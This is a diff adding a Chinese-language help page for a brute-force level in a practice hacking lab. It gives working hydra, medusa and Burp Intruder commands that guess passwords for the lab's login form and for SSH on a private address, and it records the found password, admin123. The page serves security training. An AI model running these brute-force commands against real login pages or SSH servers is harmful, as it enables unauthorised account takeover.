@@ -1,0 +1,56 @@
+<h4>hydra （推荐）</h4>
+<p>THC Hydra - 速度快、协议多、参数灵活，支持 HTTP/Post-Form 暴力破解。</p>
+<pre>
+# 基本语法
+hydra [options] target service
+
+# 本靶场实测命令（SUCCESS 条件用 S=恭喜你完成本关挑战）
+hydra -l admin -P dict_passwords.txt <?php echo site_host(); ?> http-post-form \
+  "<?php echo BASE_URL; ?>/modules/brute/index.php:username=^USER^&password=^PASS^:S=恭喜你完成本关挑战" -vV
+
+# 语法说明：
+# http-post-form "path:user_field=^USER^&pass_field=^PASS^:SUCCESS/FAIL条件"
+# FAIL=错误关键字（本靶场：用户名或密码错误）
+# SUCCESS=成功关键字（本靶场：恭喜你完成本关挑战）
+</pre>
+<p><b>实测结果：</b>1 次尝试，admin123 密码命中。Hydra 9.5 成功。</p>
+
+<h4>medusa</h4>
+<p>开源并行暴力破解工具，支持 30+ 协议，web-form 模块需额外配置。</p>
+<pre>
+# medusa web-form 语法较复杂，建议用 Hydra 或 Burp Intruder
+# 基本框架：
+medusa -h target -u user -p passfile -M web-form -d 80 -t 5
+
+# 更常用：SSH/FTPS/Telnet 等协议支持更好
+medusa -h 192.168.142.162 -u root -p 123456 -M ssh -d 22
+</pre>
+
+<h4>Burp Intruder（最直观）</h4>
+<p>抓包 → Send to Intruder → 设置 payload 位置 → 加载字典 → Start Attack</p>
+<pre>
+步骤：
+1. 随便输密码登录一次，抓到 POST 请求
+2. Send to Intruder，将 password 值标为 payload position
+3. Payloads → Simple list → Load dict_passwords.txt
+4. Options → Grep - Match：勾选 "用户名或密码错误"
+5. Start attack，不匹配的那行就是正确密码！
+</pre>
+
+<h4>Kali 实战流程</h4>
+<pre>
+# Kali 虚拟机：192.168.142.162
+# 靶场地址：http://192.168.142.1/bafanglab
+
+# 1. 下载密码字典
+curl -s "<?php echo BASE_URL; ?>/includes/dict_download.php?type=passwords" -o dict_passwords.txt
+
+# 2. hydra 爆破
+hydra -l admin -P dict_passwords.txt <?php echo site_host(); ?> http-post-form \
+  "<?php echo BASE_URL; ?>/modules/brute/index.php:username=^USER^&password=^PASS^:S=恭喜你完成本关挑战"
+
+# 3. 或直接 curl 手动验证（找到 admin123 后）
+curl -X POST "http://192.168.142.1/bafanglab/modules/brute/index.php" \
+  -d "username=admin&password=admin123" | grep -oE '恭喜你完成本关挑战'
+# → 恭喜你完成本关挑战！
+</pre>
